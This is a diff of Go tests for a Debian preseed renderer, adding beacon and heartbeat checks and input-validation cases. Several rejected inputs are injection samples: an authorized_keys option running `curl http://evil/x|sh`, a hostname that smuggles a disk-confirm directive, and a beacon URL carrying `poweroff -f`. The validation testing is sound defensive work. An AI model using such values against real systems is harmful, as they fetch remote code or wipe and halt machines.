@@ -34,7 +34,7 @@ func goodSpec() Spec {
 // signal is satisfied by the machine we believed we were overwriting and in
 // fact never touched.
 func TestRenderPreseedWritesTheUIDMarker(t *testing.T) {
-	got, err := RenderPreseed(goodSpec(), testRunURL)
+	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -47,7 +47,7 @@ func TestRenderPreseedWritesTheUIDMarker(t *testing.T) {
 }
 
 func TestRenderPreseedCarriesTheStaticNetwork(t *testing.T) {
-	got, err := RenderPreseed(goodSpec(), testRunURL)
+	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -90,7 +90,7 @@ func TestRenderPreseedRefusesAWholeKeyFile(t *testing.T) {
 	} {
 		s := goodSpec()
 		s.SSHPublicKey = key
-		if _, err := RenderPreseed(s, testRunURL); err == nil {
+		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 			t.Errorf("%s: a value carrying private key material was accepted", name)
 		}
 	}
@@ -102,7 +102,7 @@ func TestRenderPreseedRefusesAWholeKeyFile(t *testing.T) {
 func TestRenderPreseedSaysSoWhenTheValueIsPrivateKeyMaterial(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = s.SSHPublicKey + "\n-----BEGIN OPENSSH PRIVATE KEY-----"
-	_, err := RenderPreseed(s, testRunURL)
+	_, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
 	if err == nil {
 		t.Fatal("want an error, got nil")
 	}
@@ -119,7 +119,7 @@ func TestRenderPreseedRefusesAKeyThatCouldBreakOutOfThePreseedShell(t *testing.T
 	for _, comment := range []string{"don't", `back\slash`} {
 		s := goodSpec()
 		s.SSHPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILsytToxkJ2CiWuiv8BZ3hYpu7tFXn7Rwz+kc2gjbPSy " + comment
-		if _, err := RenderPreseed(s, testRunURL); err == nil {
+		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 			t.Errorf("comment %q was accepted; it breaks out of the shell quoting", comment)
 		}
 	}
@@ -132,7 +132,7 @@ func TestRenderPreseedRefusesAKeyThatCouldBreakOutOfThePreseedShell(t *testing.T
 func TestRenderPreseedRefusesASecondKeyHiddenInTheCommentField(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = s.SSHPublicKey + " " + s.SSHPublicKey
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("two keys on one line were accepted")
 	}
 }
@@ -140,7 +140,7 @@ func TestRenderPreseedRefusesASecondKeyHiddenInTheCommentField(t *testing.T) {
 func TestRenderPreseedRefusesAValueTooLongToBeAKey(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = s.SSHPublicKey + " " + strings.Repeat("x", 1024)
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("a 1100-character value was accepted")
 	}
 }
@@ -148,7 +148,7 @@ func TestRenderPreseedRefusesAValueTooLongToBeAKey(t *testing.T) {
 func TestRenderPreseedRefusesAKeyThatIsNotAnAuthorizedKeysLine(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = "hunter2"
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for a non-key, got nil")
 	}
 }
@@ -162,7 +162,7 @@ func TestRenderPreseedRefusesAKeyThatIsNotAnAuthorizedKeysLine(t *testing.T) {
 func TestRenderPreseedRefusesAKeyWithAuthorizedKeysOptions(t *testing.T) {
 	s := goodSpec()
 	s.SSHPublicKey = `command="curl http://evil/x|sh",no-pty ` + s.SSHPublicKey
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for a key carrying authorized_keys options, got nil")
 	}
 }
@@ -172,7 +172,7 @@ func TestRenderPreseedRefusesAKeyWithAuthorizedKeysOptions(t *testing.T) {
 func TestRenderPreseedNeverEmitsTheJoinToken(t *testing.T) {
 	s := goodSpec()
 	s.Cluster = ClusterTarget{Mode: ClusterJoin, ServerURL: "https://192.168.2.201:6443", JoinToken: "K10SECRETTOKEN", K3sVersion: "v1.33.4+k3s1"}
-	got, err := RenderPreseed(s, testRunURL)
+	got, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -184,7 +184,7 @@ func TestRenderPreseedNeverEmitsTheJoinToken(t *testing.T) {
 // The installer refuses on the machine if the named disk is not the size Frame
 // was told it is.
 func TestRenderPreseedAssertsDiskSizeBeforePartitioning(t *testing.T) {
-	got, err := RenderPreseed(goodSpec(), testRunURL)
+	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -206,7 +206,7 @@ func TestRenderPreseedAssertsDiskSizeBeforePartitioning(t *testing.T) {
 func TestRenderPreseedRejectsAnEmptyUID(t *testing.T) {
 	s := goodSpec()
 	s.UID = ""
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for empty UID, got nil")
 	}
 }
@@ -214,7 +214,7 @@ func TestRenderPreseedRejectsAnEmptyUID(t *testing.T) {
 func TestRenderPreseedRejectsAnEmptyHostname(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = ""
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for empty hostname, got nil")
 	}
 }
@@ -222,7 +222,7 @@ func TestRenderPreseedRejectsAnEmptyHostname(t *testing.T) {
 func TestRenderPreseedRejectsAMalformedNetworkAddress(t *testing.T) {
 	s := goodSpec()
 	s.Network.Address = "not-a-cidr"
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for a malformed network address, got nil")
 	}
 }
@@ -233,7 +233,7 @@ func TestRenderPreseedRejectsAMalformedNetworkAddress(t *testing.T) {
 func TestRenderPreseedRejectsANonIPv4Address(t *testing.T) {
 	s := goodSpec()
 	s.Network.Address = "2001:db8::1/64"
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for a non-IPv4 network address, got nil")
 	}
 }
@@ -241,7 +241,7 @@ func TestRenderPreseedRejectsANonIPv4Address(t *testing.T) {
 func TestRenderPreseedRejectsAMalformedGateway(t *testing.T) {
 	s := goodSpec()
 	s.Network.Gateway = "not-an-ip"
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for a malformed gateway, got nil")
 	}
 }
@@ -256,7 +256,7 @@ func TestRenderPreseedRejectsAMalformedGateway(t *testing.T) {
 func TestRenderPreseedRefusesAHostnameContainingANewline(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = "g9\nd-i partman/confirm boolean true"
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for a hostname containing a newline, got nil")
 	}
 }
@@ -272,7 +272,7 @@ func TestRenderPreseedRefusesAHostnameContainingANewline(t *testing.T) {
 func TestRenderPreseedNamesTheNewlineWhenAValueBreaksADirective(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = "g9\nd-i partman/confirm boolean true"
-	_, err := RenderPreseed(s, testRunURL)
+	_, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
 	if err == nil {
 		t.Fatal("want an error, got nil")
 	}
@@ -285,7 +285,7 @@ func TestRenderPreseedRefusesAHostnameContainingAQuoteOrBackslash(t *testing.T) 
 	for _, h := range []string{"g9'", `g9\`} {
 		s := goodSpec()
 		s.Hostname = h
-		if _, err := RenderPreseed(s, testRunURL); err == nil {
+		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 			t.Errorf("hostname %q was accepted; it breaks out of the shell quoting elsewhere in the preseed", h)
 		}
 	}
@@ -294,7 +294,7 @@ func TestRenderPreseedRefusesAHostnameContainingAQuoteOrBackslash(t *testing.T) 
 func TestRenderPreseedRefusesAHostnameContainingControlCharacters(t *testing.T) {
 	s := goodSpec()
 	s.Hostname = "g9\x00"
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("want error for a hostname containing a control character, got nil")
 	}
 }
@@ -305,7 +305,7 @@ func TestRenderPreseedRefusesAHostnameContainingControlCharacters(t *testing.T) 
 // up on its DHCP address under a DHCP name, and Frame waits at an address
 // nobody is on -- after wiping every named disk.
 func TestRenderPreseedRunsNetcfgAgainAfterTheFileIsLoaded(t *testing.T) {
-	got, err := RenderPreseed(goodSpec(), testRunURL)
+	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -320,7 +320,7 @@ func TestRenderPreseedRunsNetcfgAgainAfterTheFileIsLoaded(t *testing.T) {
 // constant that would match whatever was passed.
 func TestRenderPreseedCarriesTheRunURLItWasGivenNotAFixedOne(t *testing.T) {
 	other := "http://10.0.0.1:9999/preseed/ffffffffffffffffffffffffffffffff.sh"
-	got, err := RenderPreseed(goodSpec(), other)
+	got, err := RenderPreseed(goodSpec(), other, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -333,13 +333,13 @@ func TestRenderPreseedCarriesTheRunURLItWasGivenNotAFixedOne(t *testing.T) {
 }
 
 func TestRenderPreseedRefusesAnEmptyRunScriptURL(t *testing.T) {
-	if _, err := RenderPreseed(goodSpec(), "  "); err == nil {
+	if _, err := RenderPreseed(goodSpec(), "  ", "", testBeaconToken); err == nil {
 		t.Fatal("an empty preseed/run URL was accepted; the static network configuration would be inert")
 	}
 }
 
 func TestRenderPreseedRefusesARunScriptURLThatWouldBreakTheDirective(t *testing.T) {
-	if _, err := RenderPreseed(goodSpec(), "http://x/a.sh\nd-i foo/bar string baz"); err == nil {
+	if _, err := RenderPreseed(goodSpec(), "http://x/a.sh\nd-i foo/bar string baz", "", testBeaconToken); err == nil {
 		t.Fatal("a run URL carrying a newline was accepted; in a preseed that starts a new directive")
 	}
 }
@@ -351,7 +351,7 @@ func TestRenderPreseedRefusesARunScriptURLThatWouldBreakTheDirective(t *testing.
 // installed system directly, where in-target already runs, so the node's
 // name does not depend on an unobserved ordering.
 func TestRenderPreseedWritesTheHostnameOntoTheInstalledSystem(t *testing.T) {
-	got, err := RenderPreseed(goodSpec(), testRunURL)
+	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -363,27 +363,10 @@ func TestRenderPreseedWritesTheHostnameOntoTheInstalledSystem(t *testing.T) {
 	}
 }
 
-// The content of what gets served. Asserted here so the serving test
-// (server_test.go) can compare against this constant rather than against a
-// second copy of the same string.
-func TestNetcfgRerunScriptKillsDHCPThenRunsNetcfg(t *testing.T) {
-	for _, want := range []string{"kill-all-dhcp", "netcfg"} {
-		if !strings.Contains(NetcfgRerunScript, want) {
-			t.Errorf("the preseed/run script does not contain %q:\n%s", want, NetcfgRerunScript)
-		}
-	}
-	if !strings.HasPrefix(NetcfgRerunScript, "#!/bin/sh\n") {
-		t.Errorf("the preseed/run script has no interpreter line:\n%s", NetcfgRerunScript)
-	}
-	if strings.Index(NetcfgRerunScript, "kill-all-dhcp") > strings.Index(NetcfgRerunScript, "\nnetcfg") {
-		t.Error("netcfg runs before the DHCP client is killed; the lease it is meant to replace is still held")
-	}
-}
-
 func TestRenderPreseedRefusesADNSEntryThatIsNotAnIP(t *testing.T) {
 	s := goodSpec()
 	s.Network.DNS = []string{"192.168.2.254", "resolver.example.com"}
-	if _, err := RenderPreseed(s, testRunURL); err == nil {
+	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 		t.Fatal("a DNS entry that is not an IP address was accepted")
 	}
 }
@@ -391,7 +374,7 @@ func TestRenderPreseedRefusesADNSEntryThatIsNotAnIP(t *testing.T) {
 func TestRenderPreseedAcceptsAResolverListOfIPs(t *testing.T) {
 	s := goodSpec()
 	s.Network.DNS = []string{"192.168.2.254", "9.9.9.9"}
-	got, err := RenderPreseed(s, testRunURL)
+	got, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -414,7 +397,7 @@ func TestRenderPreseedRefusesANetworkWithNoResolver(t *testing.T) {
 	} {
 		s := goodSpec()
 		s.Network.DNS = dns
-		if _, err := RenderPreseed(s, testRunURL); err == nil {
+		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
 			t.Errorf("%s resolver list was accepted; the install would halt after wiping every named disk", name)
 		}
 	}
@@ -434,4 +417,123 @@ func TestValidateSpecRefusesANetworkWithNoResolver(t *testing.T) {
 	if err := ValidateSpec(goodSpec()); err != nil {
 		t.Fatalf("a good spec was refused: %v", err)
 	}
+}
+
+// The four checkpoints have to be in the rendered file, at the right
+// commands: a checkpoint emitted from the wrong hook reports a stage the
+// installer has not reached.
+func TestRenderPreseedEmitsEveryCheckpointAtItsOwnHook(t *testing.T) {
+	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, c := range []struct{ directive, checkpoint string }{
+		{"preseed/early_command", CheckpointEarly},
+		{"partman/early_command", CheckpointPartman},
+		{"preseed/late_command", CheckpointLate},
+	} {
+		line := directiveLine(t, got, c.directive)
+		if !strings.Contains(line, BeaconURL(testBeaconBase, testBeaconToken, c.checkpoint)) {
+			t.Errorf("%s does not report checkpoint %q:\n%s", c.directive, c.checkpoint, line)
+		}
+	}
+}
+
+// This is what makes the size guard legible. `early` must be emitted after
+// the assertion, so a machine that refused carries `netcfg` and nothing
+// more -- an outcome no other failure produces.
+func TestRenderPreseedReportsEarlyOnlyAfterTheDiskAssertion(t *testing.T) {
+	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
+	if err != nil {
+		t.Fatal(err)
+	}
+	line := directiveLine(t, got, "preseed/early_command")
+	assertion := strings.Index(line, "poweroff -f")
+	beacon := strings.Index(line, BeaconURL(testBeaconBase, testBeaconToken, CheckpointEarly))
+	if assertion < 0 || beacon < 0 {
+		t.Fatalf("early_command is missing the assertion or the beacon:\n%s", line)
+	}
+	if beacon < assertion {
+		t.Errorf("the early beacon is emitted before the disk assertion, so a refused machine would look like it passed:\n%s", line)
+	}
+}
+
+func TestRenderPreseedStartsTheHeartbeat(t *testing.T) {
+	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
+	if err != nil {
+		t.Fatal(err)
+	}
+	line := directiveLine(t, got, "preseed/early_command")
+	if !strings.Contains(line, "sleep 15") || !strings.Contains(line, "while true") {
+		t.Errorf("early_command does not start a heartbeat loop:\n%s", line)
+	}
+}
+
+// A beacon must never be the reason an installation stops.
+func TestRenderPreseedNeverLetsABeaconFailTheInstall(t *testing.T) {
+	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, line := range strings.Split(got, "\n") {
+		if !strings.Contains(line, "/beacon/") {
+			continue
+		}
+		if !strings.Contains(line, "|| true") {
+			t.Errorf("a beacon line has no `|| true`:\n%s", line)
+		}
+	}
+}
+
+// The cold-start path passes no base. Not "a base that goes nowhere": none.
+func TestRenderPreseedWithNoBeaconBaseEmitsNoBeacons(t *testing.T) {
+	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(got, "/beacon/") {
+		t.Errorf("a preseed rendered with no beacon base still carries beacon URLs:\n%s", got)
+	}
+}
+
+func TestRenderPreseedRefusesABeaconBaseThatWouldBreakTheDirective(t *testing.T) {
+	for _, bad := range []string{"http://x\nd-i foo/bar string baz", "http://x'; poweroff -f; '"} {
+		if _, err := RenderPreseed(goodSpec(), testRunURL, bad, testBeaconToken); err == nil {
+			t.Errorf("RenderPreseed accepted beacon base %q", bad)
+		}
+	}
+}
+
+func TestRenderRunScriptReportsNetcfgAndStillRerunsNetcfg(t *testing.T) {
+	got := RenderRunScript(testBeaconBase, testBeaconToken)
+	for _, want := range []string{"kill-all-dhcp", "\nnetcfg", BeaconURL(testBeaconBase, testBeaconToken, CheckpointNetcfg)} {
+		if !strings.Contains(got, want) {
+			t.Errorf("the preseed/run script does not contain %q:\n%s", want, got)
+		}
+	}
+	if !strings.HasPrefix(got, "#!/bin/sh\n") {
+		t.Errorf("the preseed/run script has no interpreter line:\n%s", got)
+	}
+	if strings.Index(got, "kill-all-dhcp") > strings.Index(got, "\nnetcfg") {
+		t.Error("the script runs netcfg before killing the DHCP client")
+	}
+	if bare := RenderRunScript("", testBeaconToken); strings.Contains(bare, "/beacon/") {
+		t.Errorf("a run script rendered with no beacon base carries a beacon URL:\n%s", bare)
+	}
+}
+
+// directiveLine returns the logical preseed line for a directive, joining
+// the backslash continuations d-i uses for multi-command hooks. Without the
+// join, a test searching for two strings "on the same line" would pass or
+// fail on where the template happens to wrap.
+func directiveLine(t *testing.T, preseed, directive string) string {
+	t.Helper()
+	joined := strings.ReplaceAll(preseed, "\\\n", " ")
+	for _, line := range strings.Split(joined, "\n") {
+		if strings.Contains(line, directive) {
+			return line
+		}
+	}
+	t.Fatalf("no %s directive in the rendered preseed:\n%s", directive, preseed)
+	return ""
 }
